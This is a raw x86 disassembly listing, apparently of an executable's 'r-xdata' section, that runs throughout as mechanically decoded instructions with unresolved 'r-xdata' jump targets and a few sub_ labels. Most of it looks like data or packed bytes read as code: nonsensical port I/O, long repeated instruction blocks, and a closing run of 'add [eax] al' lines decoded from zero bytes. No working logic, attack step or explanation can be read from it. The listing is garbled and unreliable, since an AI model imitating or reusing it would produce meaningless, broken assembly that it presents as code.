neg [ edi - 0x28 ]
push cs
pop ebp
loop r-xdata
push 0x77
test esi esi
out dx al
pop es
je r-xdata
fucomp st3
pop es
je r-xdata
jmp r-xdata
sbb esp [ ebp - 0x13 ]
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
push ss
iretd
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
sbb edi [ ebp - 0x3b ]
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
shr bh cl
pop ss
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test esi esi
out dx al
pop es
je r-xdata
pop es
je r-xdata
imul dh
insb
shl ebx cl
jmp r-xdata
jmp r-xdata
pop edi
lds ebx [ edi ]
insb
aam 0xd5
adc eax 0x2f3d467
jge r-xdata
pop es
je r-xdata
pop es
je r-xdata
jge r-xdata
pushad
into
sub eax 0x92a04809
neg [ edi - 0x3b ]
in al 0x15
push 0xffffffc5
in eax 0x9
dec ebp
in eax 0xc6
sub ah [ esi - 0x34 ]
[ ecx ]
jo r-xdata
loop r-xdata
dec [ eax ]
insb
shl edx 0x7a
loope r-xdata
jmp r-xdata
jmp r-xdata
r-xdata
jle r-xdata
out 0x94 eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
dec ecx
test esi esi
out 0xf3 eax
push cs
dec edx
iretd
pop es
je r-xdata
pop ss
insb
hlt
sub [ ebx + edx * 8 - 0x1d ] ch
jmp r-xdata
jge r-xdata
loopne r-xdata
jmp r-xdata
pop es
loope r-xdata
rcr [ edi + 0x69 ] 0x1
cmp [ ebx - 0x3b ] edi
test [ esi ] 0x15e4f06c
push 0xffffffc5
in eax 0x9
pop esi
mov al [ 0x5fe13c7e ]
imul edi [ esi ] 0x1de3c26c
pop edx
vcvtsi2ss xmm7 xmm3 [ ebx - 0x31 ]
cmc
pop ds
jpe r-xdata
test esi esi
out dx al
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
dec eax
mov edx 0xd25ff69d
pop ds
imul edx ebp 0xfffffff1
cmp ebp [ edx - 0x2c ]
dec [ esp + ebp * 2 ]
imul edi [ 0x2d3d46c ] 0x15d5d460
insd
pop es
je r-xdata
je r-xdata
jg r-xdata
retn
fst [ ebx ]
int3
pop ds
dec eax
mov al [ 0xffffffffc55ff692 ]
insb
aam 0xd5
adc eax 0x2f3d467
jge r-xdata
fucomp st3
loop r-xdata
imul dh
loop r-xdata
dec [ eax ]
insb
shl edx 0x7a
loope r-xdata
jae r-xdata
fucomp st3
sub_46cf7a
imul esi [ edi * 2 + 0x671fe6ef ] 0x671fe0e5
pop es
je r-xdata
imul eax [ ebp + 0x16d7d447 ] 0x1bf5cf65
jge r-xdata
pop es
je r-xdata
jmp r-xdata
or [ ecx + eax * 8 - 0xe ] ch
jpe r-xdata
rcl [ ebx ] 0x7b
aam 0xe3
test [ edi - 0x2c ] eax
xlat
jmp r-xdata
pop es
je r-xdata
sbb [ ebp - 0x37 ] edi
stc
adc al 0x9
dec eax
fwait
neg [ edi - 0x28 ]
push cs
pop ebp
push 0x77
test esi esi
out dx al
loop r-xdata
aam 0x96
xchg edx eax
jb r-xdata
jg r-xdata
pop es
je r-xdata
jmp r-xdata
jpe r-xdata
shr bh cl
jpo r-xdata
jpe r-xdata
adc edi [ ebx - 0x2c ]
jecxz r-xdata
jmp r-xdata
pop es
je r-xdata
xchg edx eax
daa
inc ebx
test [ esi ] 0x8fef46c
insb
shl edx 0x3f
jno r-xdata
jmp r-xdata
fucomp st3
pop ss
in eax dx
pop es
je r-xdata
jmp r-xdata
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
jle r-xdata
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
imul eax [ ebp + 0x14c3d447 ] 0x2ce6c164
pushad
jmp r-xdata
sbb esp [ ebp - 0x13 ]
jmp r-xdata
pop es
je r-xdata
jmp r-xdata
fucomp st3
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
push ss
iretd
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
sbb edi [ ebp - 0x3b ]
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
shr bh cl
pop ss
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
pop es
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
je r-xdata
test esi esi
out dx al
jmp r-xdata
jmp r-xdata
imul dh
insb
shl ebx cl
pop es
je r-xdata
pop es
je r-xdata
pop edi
lds ebx [ edi ]
insb
aam 0xd5
adc eax 0x2f3d467
jge r-xdata
jmp r-xdata
jmp r-xdata
jge r-xdata
pushad
into
sub eax 0x92a04809
neg [ edi - 0x3b ]
in al 0x15
push 0xffffffc5
in eax 0x9
dec ebp
in eax 0xc6
sub ah [ esi - 0x34 ]
[ ecx ]
jo r-xdata
loop r-xdata
dec [ eax ]
insb
shl edx 0x7a
loope r-xdata
pop es
je r-xdata
pop es
je r-xdata
r-xdata
jle r-xdata
out 0x94 eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
dec ecx
test esi esi
out 0xf3 eax
push cs
dec edx
iretd
jmp r-xdata
jmp r-xdata
jmp r-xdata
jge r-xdata
loopne r-xdata
pop ss
insb
hlt
sub [ ebx + edx * 8 - 0x1d ] ch
pop es
je r-xdata
pop es
loope r-xdata
rcr [ edi + 0x69 ] 0x1
cmp [ ebx - 0x3b ] edi
test [ esi ] 0x15e4f06c
push 0xffffffc5
in eax 0x9
pop esi
mov al [ 0x5fe13c7e ]
imul edi [ esi ] 0x1de3c26c
pop edx
vcvtsi2ss xmm7 xmm3 [ ebx - 0x31 ]
cmc
pop ds
jpe r-xdata
test esi esi
out dx al
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
dec eax
mov edx 0xd25ff69d
pop ds
imul edx ebp 0xfffffff1
cmp ebp [ edx - 0x2c ]
dec [ esp + ebp * 2 ]
imul edi [ 0x2d3d46c ] 0x15d5d460
insd
je r-xdata
jg r-xdata
retn
fst [ ebx ]
int3
pop ds
dec eax
mov al [ 0xffffffffc55ff692 ]
insb
aam 0xd5
adc eax 0x2f3d467
jge r-xdata
fucomp st3
loop r-xdata
imul dh
loop r-xdata
dec [ eax ]
insb
shl edx 0x7a
loope r-xdata
jae r-xdata
fucomp st3
sub_46d25f
or [ eax - 0x2e ] ch
out dx eax
xchg ebp eax
loope r-xdata
dec eax
out 0x4f al
aam 0xe3
sbb esp [ ebp - 0x1f ]
cli
push ss
retn
imul edx ebp 0xfffffff1
pop edi
rcr [ edi ] cl
out 0x4f al
cmp ebp [ edx - 0x2c ]
dec [ esp + ebp * 2 ]
aad 0xf1
out 0x4f al
aam 0xff
or al 0x6c
out 0x4f al
out 0x4f al
out 0x4f al
dec eax
[ ebp + 0x13c05ff6 ]
out 0x4f al
pop edi
rcl [ ebx ] 0x7b
out 0x4f al
out 0x94 eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmc
push cs
dec esp
aam 0xe3
sbb esp [ ebp - 0x10 ]
in al 0x15
jge r-xdata
out 0x4f al
out 0x4f al
out 0x4f al
fcom [ esi + 0x69469592 ]
test [ ebp - 0x31 ] eax
neg [ esi ]
inc ebp
out 0x4f al
dec eax
leave
scasb [ edi ]
neg [ edi - 0x40 ]
adc edi [ ebx - 0x2c ]
jecxz r-xdata
inc esi
imul eax [ ebp + 0x1ef7cf45 ] 0x8f4c945
push 0x93befd2
out 0x4f al
iretd
out 0x4f al
leave
hlt
out 0x4f al
cmp ecx [ ecx ]
shr bh cl
out 0x4f al
out 0x4f al
pop edi
rcl [ ebx ] 0x7b
out 0x4f al
out 0x4f al
loope r-xdata
out 0x4f al
retn
out 0x4f al
dec ecx
inc esp
jpe r-xdata
out 0x4f al
jns r-xdata
mov al [ 0x4fe69579 ]
out 0x4f al
jns r-xdata
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
out 0x4f al
mov edx 0xd25ff69d
pop ds
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
cmp eax 0x4894e70b
out 0x4f al
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
loope r-xdata
clc
jno r-xdata
div bh
not [ ebx ]
jge r-xdata
stc
or [ ebp - 0x3b ] cl
hlt
sub_46d3c0
insb
in al 0xf3
sbb [ edi + eax * 8 - 0x2d ] bh
or al 0x6c
into
loop r-xdata
sub [ edi + ebx - 0x4a ] 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
loope r-xdata
sub eax 0xae1f4809
jge r-xdata
cmp al 0x60
int3
inc ebx
test esi esi
jecxz r-xdata
neg [ edi - 0x2f ]
pop ds
jge r-xdata
cli
push ss
stc
adc al 0x6e
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
pop ds
mov dh 0x80
insb
loope r-xdata
div ah
xchg esi eax
aas
or ebp ebp
xchg esi eax
sub cl [ ecx ]
popfd
xchg esi eax
xchg edx eax
arpl [ ebx + 0x69 ] si
test [ edx - 0x38 ] edi
test esi esi
jecxz r-xdata
pop ds
push 0x603cf3d4
int3
sub [ ecx + 0x50 ] 0x7d
test esi esi
hlt
mov [ ebp + eax * 4 - 0xa ] fs
push cs
dec edi
leave
cli
pop ds
dec eax
aam 0xe2
or [ eax - 0x3e ] ah
jecxz r-xdata
loope r-xdata
adc al 0x7d
leave
dec esp
fdiv st3
sbb [ esp + edx * 8 - 0xd ] edi
sub eax 0xae1f4809
call [ esi ]
insb
mov al [ 0x5fda3a7e ]
imul ebp [ ecx ] 0x16fac561
insb
rol ecx cl
jpe r-xdata
xchg esi eax
xchg edx eax
inc edi
imul eax [ ebp + 0x2ae2c55a ] 0x8f9c97b
pushad
aam 0xef
cmp [ ebp - 0x3f ] esp
in eax 0x9
or [ eax + 0xb ] ecx
stosd [ edi ]
neg [ edi - 0x3b ]
push ss
insb
jno r-xdata
push ss
xchg ebx eax
movsb [ edi ] [ esi ]
jpe r-xdata
jb r-xdata
dec edi
mul bl
stc
test esi esi
sbb ebp [ ebp - 0x1a ]
dec edi
out 0x4f al
jns r-xdata
aam 0xe3
sbb esp [ ebp - 0x1f ]
cli
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
loope r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
push ss
retn
retn
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
dec ecx
inc esp
jpe r-xdata
out 0x4f al
jns r-xdata
dec edi
loope r-xdata
jns r-xdata
mov al [ 0x4fe69579 ]
out 0x4f al
jns r-xdata
clc
jno r-xdata
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
out 0x4f al
mov edx 0xd25ff69d
pop ds
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
div bh
not [ ebx ]
jge r-xdata
cmp eax 0x4894e70b
out 0x4f al
dec edi
out 0x4f al
jns r-xdata
stc
or [ ebp - 0x3b ] cl
hlt
dec eax
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
imul edx ebp 0xfffffff1
pop edi
rcr [ edi ] cl
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
cmp ebp [ edx - 0x2c ]
dec [ esp + ebp * 2 ]
aad 0xf1
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
aam 0xff
or al 0x6c
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
dec eax
[ ebp + 0x13c05ff6 ]
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
pop edi
rcl [ ebx ] 0x7b
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
out 0x94 eax
cmp eax 0x3d94e70b
or esp edi
xchg esp eax
cmc
push cs
dec esp
aam 0xe3
sbb esp [ ebp - 0x10 ]
in al 0x15
jge r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
fcom [ esi + 0x69469592 ]
test [ ebp - 0x31 ] eax
neg [ esi ]
inc ebp
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
inc esi
imul eax [ ebp + 0x1ef7cf45 ] 0x8f4c945
push 0x93befd2
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
xchg ebp eax
loope r-xdata
iretd
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
leave
hlt
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
dec eax
leave
scasb [ edi ]
neg [ edi - 0x40 ]
adc edi [ ebx - 0x2c ]
jecxz r-xdata
shr bh cl
cmp ecx [ ecx ]
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
pop edi
rcl [ ebx ] 0x7b
jns r-xdata
out 0x4f al
jns r-xdata
dec edi
out 0x4f al
jns r-xdata
jns r-xdata
dec edi
jns r-xdata
out 0x4f al
sub_46d57e
in al 0x15
pop ebp
call [ esi ]
insb
inc [ eax ]
insb
mov al [ 0x5fdd427e ]
imul edi [ 0x1fc2d46c ] 0x1bc6d064
jge r-xdata
xchg esi eax
xchg edx eax
das
je r-xdata
sar [ edx - 0x20 ] 0x7c
xchg esi eax
jpe r-xdata
into
push 0xffffffc5
in eax 0x9
or [ eax - 0x19 ] ecx
scasb [ edi ]
neg [ edi - 0x2f ]
pop ds
jge r-xdata
test [ ebp - 0x3b ] ebx
in al 0x17
pushad
into
test [ esi ] 0x15e4f06c
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
dec eax
cmpsb [ esi ] [ edi ]
mov dh dh
pop edi
xor [ eax + 0x9 ] 0xa0
jle r-xdata
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
into
clc
adc al 0x67
into
clc
adc al 0x67
into
xlat
in eax 0x26
dec edx
aad 0xe4
or [ esi + ecx * 8 - 0x1e ] ch
sub al 0x6c
shl ch cl
adc esp [ esi - 0x32 ]
0x7c28
out 0x5f al
imul esi [ 0x8d38067 ] 0x5ae4cf7b
pop ebx
sub_46d6a2
in eax 0xf
lds esi [ fs : esi - 0x1d2793cc ]
ja r-xdata
sub edi esi
in eax 0x12
pop edx
enter 0x16f3 0x65
sub [ ebx - 0xc2db5a6 ] 0x1b
jge r-xdata
push cs
adc al 0x67
dec eax
cmpsb [ esi ] [ edi ]
mov dh dh
pop edi
xor [ eax + 0x9 ] 0xa0
jle r-xdata
fstp [ eax ]
arpl bp ax
cmc
push cs
and [ edx - 0x2d95d63f ] eax
dec [ edx ]
jge r-xdata
xlat
in eax 0x26
dec edx
aad 0xe4
or [ esi + ecx * 8 - 0x1e ] ch
sub al 0x6c
shl ch cl
adc esp [ esi - 0x32 ]
0x7c28
out 0x5f al
imul esi [ 0x8d38067 ] 0x5ae4cf7b
pop ebx
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
adc al 0x67
into
clc
lds edx [ edx ]
insb
int3
sub_4725b7
mov [ ebx ] ebx
dec esp
cmc
push ecx
0x5335071b 0xf060
or [ edi + 0x5c900a27 ] 0x4d
adc edx [ esi ]
shld [ ebx + 0x75 ] ebx cl
inc esp
xchg esi eax
cmp ch ah
cmp al 0x58
clc
iretd
sub_473413
pop es
add [ eax ] al
loopne r-xdata
add [ eax ] eax
add [ eax - 0x80000000 ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x810000
add [ eax - 0x3fffff7d ] al
pop [ eax ]
add al dh
inc [ eax ]
add bh bh
inc [ eax ]
add [ eax ] ch
add [ eax ] al
add [ eax ] ch
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] eax
sbb [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
